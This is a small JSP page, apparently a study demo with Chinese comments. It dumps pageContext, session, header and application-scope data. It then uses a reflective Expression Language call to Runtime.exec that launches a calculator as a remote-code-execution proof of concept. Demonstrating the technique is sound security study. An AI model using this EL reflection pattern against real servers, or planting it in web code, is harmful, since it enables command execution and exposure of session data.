<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page isELIgnored="false" %>

<!-- 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）-->

<p>${pageContext}</p>
<p>${pageContext.session}</p>
<p>${pageContext.getSession()}</p>
<p>${pageContext.getSession().getServletContext()}</p>
<p>${header}</p>
<p>${applicationScope}</p>
<!-- 执行命令 -->
<%
    String cmd = "/usr/bin/gnome-calculator";
    request.setAttribute("cmd",cmd);
%>
<p>
    String cmd = ${cmd};
    ${pageContext.setAttribute("RCE",Class.forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),cmd))}
</p>
